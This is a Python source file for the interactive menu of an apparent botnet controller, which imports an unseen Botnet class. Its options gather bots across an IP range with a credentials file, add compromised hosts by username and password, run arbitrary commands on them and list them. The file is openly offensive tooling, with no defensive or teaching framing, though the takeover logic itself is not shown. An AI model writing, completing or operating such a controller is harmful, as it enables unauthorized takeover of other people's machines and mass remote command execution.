from botnet import Botnet

def display_banner():
    print("=================================")
    print("=        Botnet Management       =")
    print("=================================")


def main_menu(botnet):
    try:
        while True:
            display_banner()
            print("1. Gather Bots")
            print("2. Add Bot")
            print("3. Execute Command")
            print("4. List Bots")
            print("5. Exit")
            choice = input("Enter your choice: ")

            if choice == '1':
                ip_range = input("Enter IP range (e.g., 192.168.1.0/24): ")
                credentials_file = input("Enter credentials file path: ")
                print("[+] Gathering bots...")
                botnet.gather_bots(ip_range, credentials_file)
            elif choice == '2':
                host = input("Enter bot IP: ")
                user = input("Enter username: ")
                password = input("Enter password: ")
                if botnet.add_client(host, user, password):
                    print("[+] Bot added successfully.")
                else:
                    print("[-] Failed to add bot.")
            elif choice == '3':
                command = input("Enter command to execute: ")
                botnet.execute(command)
            elif choice == '4':
                botnet.list_bots()
            elif choice == '5':
                print("Exiting...")
                break
            else:
                print("Invalid option. Please try again.")
    except KeyboardInterrupt:
        print("Exiting...")
        exit(0)


if __name__ == '__main__':
    main_menu(Botnet())
